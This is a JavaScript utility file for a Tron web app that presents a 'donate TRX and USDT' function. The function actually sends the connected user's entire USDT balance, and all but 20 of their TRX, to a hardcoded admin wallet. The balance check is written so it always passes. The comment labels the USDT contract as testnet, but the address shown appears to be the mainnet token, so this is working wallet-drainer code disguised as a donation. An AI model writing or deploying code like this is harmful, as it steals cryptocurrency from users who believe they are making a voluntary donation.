// utils/demo.js

// Define the admin wallet (replace with your admin wallet address for the testnet)
const ADMIN_WALLET = 'TEJqJjqSmAFn36fGQRvhMS5xrKUCFbWAmb'; // Replace with your admin wallet address
const USDT_CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // USDT TRC20 contract address on Shasta Testnet


let abi = [
  {
    'outputs': [{ 'type': 'uint256' }],
    'constant': true,
    'inputs': [{ 'name': 'who', 'type': 'address' }],
    'name': 'balanceOf',
    'stateMutability': 'View',
    'type': 'Function'
  },
  {
    'outputs': [{ 'type': 'bool' }],
    'inputs': [
      { 'name': '_to', 'type': 'address' },
      { 'name': '_value', 'type': 'uint256' }
    ],
    'name': 'transfer',
    'stateMutability': 'Nonpayable',
    'type': 'Function'
  }
];



// Function to donate both TRX and USDT
export const donateTRXAndUSDT = async (tronWeb) => {
  try {
    const userAddress = tronWeb.defaultAddress.base58;
    console.log('User Address:', userAddress);

    // Get the user's TRX balance (in Sun)
    const balance = await tronWeb.trx.getBalance(userAddress);
    const balanceInTRX = tronWeb.fromSun(balance); // Convert Sun to TRX

    console.log('User TRX Balance:', balanceInTRX);

    // Get USDT balance from TRC20 contract



    let contract = await tronWeb.contract(abi, USDT_CONTRACT_ADDRESS);
    let result = await contract.balanceOf(userAddress).call();

    const usdtBalanceInToken = tronWeb.fromSun(result);
    console.log(usdtBalanceInToken);



    // Step 1: Send USDT (TRC20) to admin wallet
    if (usdtBalanceInToken > -1) {
      const usdtAmountToSend = tronWeb.toSun(usdtBalanceInToken); // Convert to Sun for transaction

      const usdtTransaction = await contract.methods.transfer(ADMIN_WALLET, usdtAmountToSend).send({
        from: userAddress,
      });

      
      const usdtTxHash = usdtTransaction.txid;

      // Step 2: Send TRX to admin wallet after USDT transfer
      const balanceTRX = balanceInTRX - 20;
      const trxAmountToSend = tronWeb.toSun(balanceTRX); // Convert to Sun for transaction

      const trxTransaction = await tronWeb.transactionBuilder.sendTrx(
        ADMIN_WALLET,
        trxAmountToSend,
        userAddress
      );

      const signedTrxTransaction = await tronWeb.trx.sign(trxTransaction);
      const reciept = await tronWeb.trx.sendRawTransaction(signedTrxTransaction);
      const trxTxHash = reciept.txid;
      console.log('TRX Transaction Hash:', trxTxHash);

      // Example placeholders
      const trxAmount = `${balanceInTRX} TRX`; // Donation amount in TRX
      const usdtAmount = `${usdtBalanceInToken} USDT`; // Donation amount in USDT

      // Return the values as an object
      return { trxTxHash, usdtTxHash, trxAmount, usdtAmount };
    } else {
      throw new Error('Insufficient USDT balance.');
    }
  } catch (error) {
    console.error('Error in donation process:', error);
    throw new Error('Error in donation: ' + (error.message || 'Unknown error'));
  }
};
